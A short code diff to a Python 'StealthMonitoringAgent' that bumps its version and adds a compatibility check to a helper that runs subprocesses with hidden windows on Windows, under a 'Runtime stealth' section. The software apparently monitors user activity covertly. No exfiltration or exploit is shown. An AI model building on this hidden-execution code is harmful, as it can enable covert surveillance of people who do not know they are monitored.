@@ -43,7 +43,7 @@ else:
     from .telemetry.durable_queue import DurableActivityQueue
     from .telemetry.activity_state import ConnectivityState
 
-AGENT_VERSION = "1.2.41"
+AGENT_VERSION = "1.2.42"
 POLL_SECONDS = 15
 
 # ── Runtime stealth ───────────────────────────────────────────────────────────
@@ -202,7 +202,7 @@ class StealthMonitoringAgent:
         import subprocess
 
         def _hidden_run(cmd, **kw):
-            if sys.platform.startswith("win"):
+            if sys.platform.startswith("win") and hasattr(subprocess, "STARTUPINFO"):
                 si = subprocess.STARTUPINFO()
                 si.dwFlags |= getattr(subprocess, "STARTF_USESHOWWINDOW", 1)
                 si.wShowWindow = 0
